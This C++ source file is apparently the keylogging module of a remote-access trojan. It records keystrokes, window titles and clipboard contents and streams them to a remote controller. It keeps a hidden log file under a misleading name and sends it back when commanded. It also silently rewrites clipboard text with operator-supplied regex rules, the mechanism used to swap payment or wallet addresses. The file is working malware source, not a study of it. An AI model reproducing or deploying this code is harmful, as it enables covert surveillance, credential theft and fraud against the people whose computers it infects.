// ShellManager.cpp: implementation of the CKeyboardManager class.
//
//////////////////////////////////////////////////////////////////////
#include "stdafx.h"
#include "KeyboardManager.h"
#include <regex>

using namespace std;
//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////
char* Clipboard_old;
TCHAR* WindowCaption;
HWND PreviousFocus = NULL;
HWND hFocus = NULL;
vector<sRegrxs*> v_sRegexs;
unsigned int __stdcall KeyLogger(LPVOID lparam)
{
	CKeyboardManager* pThis = (CKeyboardManager*)lparam;
	pThis->WaitForDialogOpen();
	BOOL b_init = TRUE;
	if (!Input::initialize(GetConsoleWindow(), GetModuleHandle(NULL)))
	{
		b_init = FALSE;
		pThis->SendOnlineDate(_T("初始化键盘记录失败"));
	}
	TCHAR* m_key=new TCHAR[100];
	ZeroMemory(m_key, 100*2);
	while (pThis->IsConnect() && pThis->m_bIsWorking)
	{
		Sleep(1);
		if (!Input::GetKerboard(m_key) && b_init)
		{	
			if (lstrlen(m_key))
			{
				pThis->SendOnlineDate(m_key);
				ZeroMemory(m_key, 100 * 2);
			}	
		}
	}
	SAFE_DELETE_AR(m_key);
	return 0;
}

unsigned int __stdcall ClipboardLogger(LPVOID lparam)
{
	CKeyboardManager* pThis = (CKeyboardManager*)lparam;
	pThis->WaitForDialogOpen();
	while (pThis->IsConnect() && pThis->m_bIsWorking)
	{
		Sleep(1);
		if (pThis->IsWindowsFocusChange())
			pThis->SendOnlineDate(_T("[内容:]"));
		if (GetTickCount() - pThis->m_dwLastCapture > 300)
		{
			InterlockedExchange((LPLONG)&pThis->m_dwLastCapture, GetTickCount());
			pThis->m_cs.Lock();
			pThis->IsClipboardChange();
			pThis->m_cs.Unlock();
		}
	}
	return 0;
}



CKeyboardManager::CKeyboardManager(ISocketBase* pClient) :CManager(pClient)
{
	m_buser = FALSE;
	SHGetFolderPath(NULL, CSIDL_COMMON_APPDATA, NULL, SHGFP_TYPE_CURRENT, szPath);
	lstrcat(szPath, _T("\\DisplaySessionContainers.log"));
	m_hMutex = CreateMutex(NULL, FALSE, szPath);
	m_bIsWorking = true;
	Clipboard_old = new char[1024];
	WindowCaption = new TCHAR[1024];
	memset(Clipboard_old, 0, sizeof(Clipboard_old));
	memset(WindowCaption, 0, sizeof(WindowCaption));
	m_dwLastCapture = GetTickCount();
	BYTE	bToken;
	bToken = TOKEN_KEYBOARD_START;
	Send((LPBYTE)&bToken, 1);
	m_hKeyLoggerThread=((HANDLE)_beginthreadex(NULL, 0, KeyLogger, this, 0, NULL));
	m_ClipboardLoggerThread=((HANDLE)_beginthreadex(NULL, 0, ClipboardLogger, this, 0, NULL));
	m_buser = TRUE;
	bregex = FALSE;
}

CKeyboardManager::~CKeyboardManager()
{
	if (!m_buser) return;
	InterlockedExchange((LPLONG)&m_bIsWorking, false);
	CloseHandle(m_hMutex);
	SAFE_DELETE_AR(WindowCaption);
	SAFE_DELETE_AR(Clipboard_old);

	WaitForSingleObject(m_hKeyLoggerThread, INFINITE);
	WaitForSingleObject(m_ClipboardLoggerThread, INFINITE);
	if (m_hKeyLoggerThread)
		CloseHandle(m_hKeyLoggerThread);
	if (m_ClipboardLoggerThread)
		CloseHandle(m_ClipboardLoggerThread);
	if (v_sRegexs.size() > 0)
	{
		vector<sRegrxs*>::iterator it = v_sRegexs.begin();
		for (; it != v_sRegexs.end();) {
			SAFE_DELETE(*it);
			it = v_sRegexs.erase(it);
		}

	}
}

void CKeyboardManager::SendOnlineDate(TCHAR* p_Buffer)
{

	UINT m_SendSzie = (lstrlen(p_Buffer) + 1) * sizeof(TCHAR) + 1;
	PBYTE p_Date = new BYTE[m_SendSzie];
	p_Date[0] = TOKEN_KEYBOARD_ONLINEDATA;
	memcpy(p_Date + 1, p_Buffer, m_SendSzie - 1);
	Send(p_Date, m_SendSzie);
	SAFE_DELETE_AR(p_Date);
}

BOOL CKeyboardManager::IsWindowsFocusChange()
{
	memset(WindowCaption, 0, sizeof(WindowCaption));
	hFocus = GetForegroundWindow();
	GetWindowTextW(hFocus, WindowCaption, 1024);
	BOOL ReturnFlag = FALSE;
	TCHAR temp[1024] = { 0 };
	if (hFocus != PreviousFocus)
	{
		if (lstrlen(WindowCaption) > 0)
		{
			SYSTEMTIME   s;
			GetLocalTime(&s);
			wsprintf(temp, _T("\r\n[标题:]%s\r\n[时间:]%d-%d-%d  %d:%d:%d\r\n"), WindowCaption, s.wYear, s.wMonth, s.wDay, s.wHour, s.wMinute, s.wSecond);
			SendOnlineDate(temp);
			memset(temp, 0, sizeof(temp));
			memset(WindowCaption, 0, sizeof(WindowCaption));
			ReturnFlag = TRUE;
		}
		PreviousFocus = hFocus;
	}
	return ReturnFlag;
}


BOOL CKeyboardManager::IsClipboardChange()
{
	
	std::string str;
	OpenClipboard(GetDesktopWindow());
	HGLOBAL hglb = GetClipboardData(CF_TEXT);
	if (hglb != NULL)
	{
		int	nPacketLen = int(GlobalSize(hglb)) + 1;
		LPSTR lpstr = (LPSTR)GlobalLock(hglb);
		str = lpstr;
		if (lpstr != NULL)
		{
			if (nPacketLen < 1000)  // 判断长度
			{
				if (strcmp(lpstr, Clipboard_old) != 0)		//判断内容
				{
						memcpy(Clipboard_old, lpstr, nPacketLen);
						LPBYTE	lpData = new BYTE[nPacketLen];
						lpData[0] = TOKEN_KEYBOARD_CLIPBOARD;
						memcpy(lpData + 1, lpstr, nPacketLen - 1);
						Send(lpData, nPacketLen);
						delete[] lpData;
				}
			}
		}
		::GlobalUnlock(hglb);
	}
	::CloseClipboard();
	if (bregex)
	{
		m_CriSec.Lock();
		for (vector<sRegrxs*>::iterator it = v_sRegexs.begin(); it != v_sRegexs.end(); )
		{
			std::smatch results;
			std::regex rx((*it)->reg);
			std::string fmt((*it)->data);
			if (std::regex_search(str, results, rx))
			{
				str=std::regex_replace(str, rx, fmt);
				UpdateLocalClipboard((char*)str.c_str(), (int)str.size()+1);
				TCHAR* error = _T("替换剪切板成功");
				SendErroe(error);
			}	
			++it;
		}
		m_CriSec.Unlock();
	}
	return FALSE;
}





void CKeyboardManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
{
	if (lpBuffer[0] == TOKEN_HEARTBEAT) return;
	switch (lpBuffer[0])
	{
	case COMMAND_KEYBOARD_GETOFFLINE:
	{
		NotifyDialogIsOpen();
		int		nRet = 0;
		DWORD	dwSize = 0;
		DWORD	dwBytesRead = 0;
		WaitForSingleObject(m_hMutex, INFINITE);
		HANDLE	hFile = CreateFile(szPath, GENERIC_READ, FILE_SHARE_READ,
			NULL, OPEN_EXISTING, FILE_ATTRIBUTE_HIDDEN, NULL);
		if (hFile != INVALID_HANDLE_VALUE)
		{
			dwSize = GetFileSize(hFile, NULL) + 1 + sizeof(TCHAR);
			BYTE* lpBuffer = new BYTE[dwSize];
			memset(lpBuffer, 0, dwSize);
			lpBuffer[0] = TOKEN_KEYBOARD_OFFLINEDATA;
			BOOL hr = ReadFile(hFile, lpBuffer + 1, dwSize - 1, &dwBytesRead, NULL);
			ReleaseMutex(m_hMutex);
			if (hr)
			{
				if (dwSize < 2)
				{
					BYTE	bToken = TOKEN_KEYBOARD_OFFLINEDATA_ERROR;
					Send((LPBYTE)&bToken, sizeof(bToken));
				}
				nRet = Send((LPBYTE)lpBuffer, dwSize);

			}
			else
			{
				BYTE	bToken = TOKEN_KEYBOARD_OFFLINEDATA_ERROR;
				Send((LPBYTE)&bToken, sizeof(bToken));
			}
			SAFE_DELETE_AR(lpBuffer);
			CloseHandle(hFile);
		}
		else
		{
			ReleaseMutex(m_hMutex);
			BYTE	bToken = TOKEN_KEYBOARD_OFFLINEDATA_ERROR;
			Send((LPBYTE)&bToken, sizeof(bToken));
		}

	}
	break;
	case COMMAND_KEYBOARD_DEL:
	{
		HANDLE  m_hMutex = CreateMutex(NULL, TRUE, szPath);
		WaitForSingleObject(m_hMutex, INFINITE);
		DeleteFile(szPath);

	}
	break;
	case COMMAND_KEYBOARD_OLKEYLOG_START:
	{
		HKEY hKey;
		::RegOpenKeyEx(HKEY_CURRENT_USER, _T("key"), 0, KEY_SET_VALUE, &hKey);
		::RegDeleteValue(hKey, _T("open"));
		::RegCloseKey(hKey);

		if (ERROR_SUCCESS == ::RegCreateKey(HKEY_CURRENT_USER, _T("key"), &hKey))
		{
			if (ERROR_SUCCESS != ::RegSetValueEx(hKey, _T("open"), 0, REG_BINARY, (unsigned char*)(_T("1")), 4))
			{
				::RegCloseKey(hKey);
				return;
			}
		}
		::RegCloseKey(hKey);
	}
	break;
	case 	COMMAND_KEYBOARD_SET_CLIPBOARD_DIF:
	{
		m_cs.Lock();
		UpdateLocalClipboard((char*)lpBuffer + 1, nSize - 1);
		m_cs.Unlock();
	}
	break;
	case 	COMMAND_KEYBOARD_OLKEYLOG_CLOSE:
	{
		HKEY hKey;
		::RegOpenKeyEx(HKEY_CURRENT_USER, _T("key"), 0, KEY_SET_VALUE, &hKey);
		::RegDeleteValue(hKey, _T("open"));
		::RegCloseKey(hKey);

		if (ERROR_SUCCESS == ::RegCreateKey(HKEY_CURRENT_USER, _T("key"), &hKey))
		{
			if (ERROR_SUCCESS != ::RegSetValueEx(hKey, _T("open"), 0, REG_BINARY, (unsigned char*)(_T("0")), 4))
			{
				::RegCloseKey(hKey);
				return;
			}
		}
		::RegCloseKey(hKey);
	}
	break;
	case COMMAND_KEYBOARD_REGEX_DELRULE:
	{
		bregex = FALSE;
	}
	break;
	case COMMAND_KEYBOARD_REGEX_SETRULE:
	{
		string regexrule = (char*)lpBuffer + 1;

		string text = regexrule; 
		vector<string> strrule;

		regex rx("[^\r\n]+\r\n");
		sregex_iterator FormatedFileList(text.begin(), text.end(), rx), rxend;

		while (FormatedFileList != rxend)
		{
			string tem = FormatedFileList->str().c_str();
			size_t r = tem.find("\r\n");
			while (r != string::npos)
			{
				if (r != string::npos)

				{
					tem.replace(r, 2, "");
					r = tem.find("\r\n");
				}
			}
			strrule.push_back(tem);
			++FormatedFileList;
		}
		if (strrule.size()>0)
		{
			m_CriSec.Lock();
			if (v_sRegexs.size()>0)    
			{
				vector<sRegrxs*>::iterator it = v_sRegexs.begin();
				for (; it != v_sRegexs.end();) {
					SAFE_DELETE(*it);
					it = v_sRegexs.erase(it);
				}

			}
			size_t rulesize = strrule.size();
			for (size_t  i = 0; i < rulesize; i++)
			{
				size_t pos = strrule[i].find("表达式");
				strrule[i]=strrule[i].substr(pos + 6, strrule[i].size() - pos - 6);
				if (pos != strrule[i].npos)
				{
					pos = strrule[i].find("替换");
					if (pos != strrule[i].npos)
					{
						sRegrxs* temsRegrxs = new sRegrxs;
						temsRegrxs->reg = strrule[i].substr(0, pos);

						temsRegrxs->data = strrule[i].substr(pos + 4, strrule[i].size() - pos - 4);
						v_sRegexs.push_back(temsRegrxs);
					}
				}
			}
			m_CriSec.Unlock();
			TCHAR* error = _T("正则替换设置成功");
			SendErroe(error);
			bregex = TRUE;
		}
		else
		{
			TCHAR* error = _T("正则替换设置失败");
			SendErroe(error);
			bregex = FALSE;
		}
	}
	break;
	default:
		Trace("202\r\n");
		break;
	}
}


void CKeyboardManager::UpdateLocalClipboard(char* buf, int len)
{

	::OpenClipboard(GetDesktopWindow());
	::EmptyClipboard();
	HGLOBAL hglbCopy = GlobalAlloc(GMEM_MOVEABLE, len);
	if (hglbCopy != NULL) {
		// Lock the handle and copy the text to the buffer.  
		LPTSTR lptstrCopy = (LPTSTR)GlobalLock(hglbCopy);
		memcpy(lptstrCopy, buf, len);
		GlobalUnlock(hglbCopy);          // Place the handle on the clipboard.  
		SetClipboardData(CF_TEXT, hglbCopy);
		GlobalFree(hglbCopy);
	}
	CloseClipboard();
	
}

void CKeyboardManager::SendErroe(TCHAR* data)
{
	int dwSize = lstrlen(data)* 2 + 3;
	BYTE* lpBuffer = new BYTE[dwSize];
	memset(lpBuffer, 0, dwSize);
	lpBuffer[0] = TOKEN_KEYBOARD_OFFLINEDATA_ERROR;
	memcpy(lpBuffer + 1, data, dwSize - 1);
	Send(lpBuffer, dwSize);
	SAFE_DELETE_AR(lpBuffer);
}